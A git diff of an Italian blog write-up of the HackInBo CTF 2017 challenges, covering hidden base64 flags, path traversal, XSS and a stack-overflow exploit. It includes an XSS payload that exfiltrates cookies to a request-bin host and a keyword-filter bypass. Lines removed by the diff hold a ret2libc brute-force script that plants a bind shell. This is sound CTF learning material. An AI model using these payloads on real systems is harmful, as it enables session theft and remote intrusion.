@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "HackInBoCTF 2017 Spring Edition"
-date:   2017-01-27 14:15
+date:   2017-04-03 00:00
 categories: CTF
 tags: [HiBCTF2017]
 categories: [Web,Crypto,Reversing]
@@ -24,7 +24,8 @@ Nella [home page](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition
 
 `<!-- SXQncyBub3QgdGhhdCBoYXJkIGZsYWc6IDRiMTQwZjdlN2QzYzA0YmI3YjU0ZjY5NmFiNThhNDQx -->`
 
-Tradotto dal base64 restituiva: `It's not that hard flag: 4b140f7e7d3c04bb7b54f696ab58a441`
+Tradotto dal base64 restituiva:
+`It's not that hard flag: 4b140f7e7d3c04bb7b54f696ab58a441`
 
 ---
 ## Oh, did I get banned?
@@ -35,7 +36,7 @@ Il file [403.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition
 ---
 ## Double Rainbow
 
-Questa flag è stata recuperata dopo aver avuto accesso ad `Admin Session`. Leggendo il codice di [settings.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/settings.php). La pagina accettava il parametro `edit` via `GET`, che permetteva di accedere a qualsiasi file sul sistema.
+Questa flag è stata recuperata dopo aver avuto accesso ad "Admin Session". Leggendo il codice di [settings.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/settings.php). La pagina accettava il parametro `edit` via `GET`, che permetteva di accedere a qualsiasi file sul sistema.
 
 Tramite nikto è stata trovata la pagina [http://ctf-hib.thesthack.com/invoker/JMXInvokerServlet](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/JMXInvokerServlet) che diceva:
 `Double Rainbow Flag is sleeping here`
@@ -69,6 +70,8 @@ Una volta settato il cookie `PHPSESSID` con il valore appena ottenuto, siamo riu
 ---
 ## C Source
 
+Questa flag è stata ottenuta dopo aver ottenuto code execution sul webserver (vedi la sezione dopo `Admin Session`), dato che la flag era in un binario offerto dal server backend (che aveva il compito di gestire i pagamenti).
+
 Durante l'analisi (reversing) del binario **server** oltre a rilevare una vulnerabilità di tipo stack-based overflow abbiamo notato che vi era una costante mai utilizzata all'interno del codice questa riportava il seguente MD5 (flag)
 
 `355c71e5b0f5e70ab77f27d750a2a75a`
@@ -81,8 +84,10 @@ La pagina [user.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdit
 Il payload che ci ha permesso di ottenere la sessione dell'amministratore è il seguente:
 
 ```html
-<scalertript>document.write("<img src=http://requestb.in/xxxxxxx?='"%2bdocument.cookie%2b"'>")</scalertript>
+<scalertript>document.write("<img src=http://requestb.in/xxxxxxx?"+document.cookie+">")</scalertript>
 ```
+
+Abbiamo utilizzato `scalertript` come tag perché il server filtrava alcune parole chiave, tra cui `alert`. Annidando la stringa in questo modo abbiamo fatto sì che il tag finale risultasse `<script>`.
 
 Il risultato/flag era: `PHPSESSID=7fa26c8192a47a49b9530be18e1310e5`
 
@@ -98,6 +103,7 @@ Cambiando i valori di `fullpath` e/o `filepath` era possibile accedere a qualsia
 Il file `settings.php` includeva [editor.php](https://github.com/jbzteam/CTF/blob/master/HiB17_SpringEdition/editor.php) che conteneva i dettagli di come veniva utilizzato l'oggetto `StyleEditor`:
 
 ```php
+<?php
 Class StyleEditor{
     public $filepath;
     public $fullpath;
@@ -194,7 +200,7 @@ Nel pannello amministrativo del webserver abbiamo notato un indirizzo IP interno
 ```bash
 nc -v -z 10.0.0.165 1-65535
 ```
-Abbiamo trovato due porte aperte: la `80` e la `65099`.
+Abbiamo trovato due porte aperte: la `22`,  `80` e la `65099`.
 
 Alla porta `65099` rispondeva un servizio custom che dopo aver passato una stringa qualsiasi restituiva `[OK] CC RECEIVED`. Alla porta `80` rispondeva un webserver.
 
@@ -262,24 +268,7 @@ Purtroppo rimane un altro problema il binario non ha controllo sui file descript
 l'ultima parte del payload chiamata per semplicità "comando" dovrà contenere il comando da far eseguire ad system e sarà un puntato ad una stringa contenuta nel binario. 
 Abbiamo quindi due possibilità o andare a cercare in memoria gli indirizzi di ogni singola lettera componendo cosi il nostro comando o più semplicemente bruteforzare il puntatore al buffer che inviamo tramite socket, abbiamo optato per la seconda.
 tramite analisi dimanica su una macchina debian simile al target abbiamo notato che l'assenza di ASLR faceva si che il nostro buffer fosse presente nel range 0xbfffe000 - 0xbfffffff lasciando così 8191 possibili indirizzi da bruteforzare.
-Abbiamo quindi realizzato uno script python per eseguire un comando arbitrario una volta indovinato l'indirizzo corretto:
-```
-import struct
-import socket
-
-def p(address):
-        return struct.pack("<I", address)
-# 0xb7e643e0 indirizzo system
-# 0xb7e571b0 indirizzo exit
-for x in range(0xbfffe000, 0xbfffffff):
-        print hex(x)
-        cmd = 'python -c \'import base64; exec base64.b64decode("aW1wb3J0IG11bHRpcHJvY2Vzc2luZwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc29ja2V0CnB3ZCA9ICJKQlpURUFNITIwMTciCmRlZiBwKHMpOgogICAgcy5zZW5kKCJJbnNlcnQgcGFzc3dvcmQgZm9yIEpCWiBURUFNOiAiKQogICAgcGFzc3dkID0gcy5yZWN2KDEwMjQpCiAgICBpZiBwd2QgaW4gcGFzc3dkOgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oWyJiYXNoIl0sIHN0ZG91dD1zLm1ha2VmaWxlKCksIHN0ZGluPXMubWFrZWZpbGUoKSkud2FpdCgpCiAgICBlbHNlOgogICAgICAgIHJldHVybgpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmJpbmQoKCcnLDMxMzM3KSkKcy5saXN0ZW4oMSkKd2hpbGUgVHJ1ZTogc29jayxhZGRyPXMuYWNjZXB0KCk7IG11bHRpcHJvY2Vzc2luZy5Qcm9jZXNzKHRhcmdldD1wLCBhcmdzPShzb2NrLCkpLnN0YXJ0KCkK")\''
-        r = cmd + 'A' * (1036-len(cmd)) + p(0xb7e643e0) + p(0xb7e571b0) + p(x)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('scusette.it', 6060))
-        s.send(r)
-        s.close()
-```
+Abbiamo quindi realizzato uno script python per eseguire un comando arbitrario una volta indovinato l'indirizzo corretto [bruteforcer.py](https://raw.githubusercontent.com/jbzteam/CTF/master/HiB17_SpringEdition/bruteforce.py)
 una volta terminato il bruteforce abbiamo notato che il nostro comando era stato eseguito consentendoci l'accesso alla macchiana mediante la porta 31337
 ```
 www-data@www:/var/www/CTF/support$ nc 10.0.0.165 31337
@@ -293,6 +282,7 @@ Abbiamo così ottenuto la flag nascosta sul server
 ```
 pci zone flag: 95429c6709bb99d1ed06d2a99bc6ffbc
 ```
+
 ---
 ## ECB Padding
 
@@ -347,6 +337,8 @@ Hashato in md5 abbiamo ottenuto la flag:
 
 
 -------------------------------------------------------------------------
-                                 The End                                 
--------------------------------------------------------------------------
+## The End                                 
+
+
+
 
